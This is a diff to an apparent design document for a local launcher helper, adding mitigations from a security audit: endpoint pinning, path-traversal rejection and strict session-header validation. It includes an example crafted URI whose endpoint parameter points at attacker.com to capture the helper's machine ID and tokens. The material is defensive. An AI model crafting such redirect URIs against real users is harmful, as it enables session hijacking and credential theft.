@@ -755,6 +755,31 @@ packages/agentwiki-launcher/    (npm workspace, publishes
   process bind first and impersonate the helper. Frontend only ever
   reads `helper_port` from the matching `probe-status` response (not
   from a constant).
+- **Endpoint pinned by helper, not trusted from URI (R2 audit #1).**
+  The `agentwiki://run?...&endpoint=https://attacker.com/...` URI can
+  be crafted by anyone. If the helper trusted that endpoint, an
+  attacker could redirect the exchange POST to a server they control,
+  capture the helper's `machine_id`, and return a forged manifest +
+  attacker-owned `mcp_token` — full session hijack. **Mitigation:**
+  the helper persists the wiki's endpoint at install time to
+  `~/.agentwiki/endpoint.url` (mode 0600). The URI's `endpoint`
+  parameter is **ignored**; the helper always POSTs to the pinned
+  endpoint. If the URI's endpoint differs from the pinned value, the
+  helper logs the mismatch and aborts. Setting the pinned endpoint:
+  the `/agents` page's install instructions include
+  `agentwiki-launcher set-endpoint https://my-wiki.example.com` as a
+  required post-install step (or the first probe-ack from a wiki
+  triggers it after user confirmation).
+- **Wiki-path traversal rejected at API boundary (R2 audit #2).**
+  `POST /api/launch` runs `wiki_path` through
+  `app/wiki/filesystem.py:safe_rel_path` before any FS read, before
+  ACL check, before frontmatter parse. Any path containing `..`,
+  absolute paths, or traversal patterns returns 400. Same protection
+  the existing wiki-doc routes enforce.
+- **`X-Agentwiki-Session` header strictly validated (R2 audit #10).**
+  Header value must match `^as_[a-zA-Z0-9-]{1,64}$` before any DB
+  lookup. Rejects header injection / control chars / overlong values
+  before they reach query / log statements.
 - **No bearer token in spawned-process env (P0 audit fix #12).**
   Even though the user owns the env vars in their own terminal,
   putting the bearer in `AGENTWIKI_MCP_TOKEN` propagates it into
